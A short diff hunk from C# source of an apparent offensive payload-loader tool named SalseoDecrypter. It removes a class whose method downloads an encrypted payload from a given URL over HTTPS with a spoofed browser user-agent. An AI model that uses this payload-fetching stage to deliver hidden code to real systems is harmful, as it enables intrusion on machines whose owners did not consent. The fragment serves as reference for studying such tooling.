@@ -342,42 +342,6 @@ namespace SalseoDecrypter
         }
     }
     
-    public class ClienteWebhttps
-    {
-
-
-        public static string LeePayload(string URL)
-        {
-
-            try
-            {
-            	System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls; 
-                Console.ForegroundColor = ConsoleColor.Gray;
-                Console.WriteLine("[+] Leyendo datos via HTTPS...");
-                WebClient client = new WebClient();
-                client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
-                client.Headers.Add("Cache-Control", "no-cache");
-                Stream data = client.OpenRead(URL);
-                StreamReader reader = new StreamReader(data);
-                string Salseo_Encriptado = reader.ReadToEnd();
-                data.Close();
-                reader.Close();
-                return Salseo_Encriptado;
-            }
-            catch
-            {
-
-                Console.WriteLine("[-] Error: No se pudo conectar con la URL proporcionada :(");
-                Environment.Exit(1);
-                return "[-] Error: No se pudo conectar con la URL proporcionada :(";
-
-            }
-
-        }
-    }
-
-
-
     public class LeeArchivoSMBorLocal
     {
 
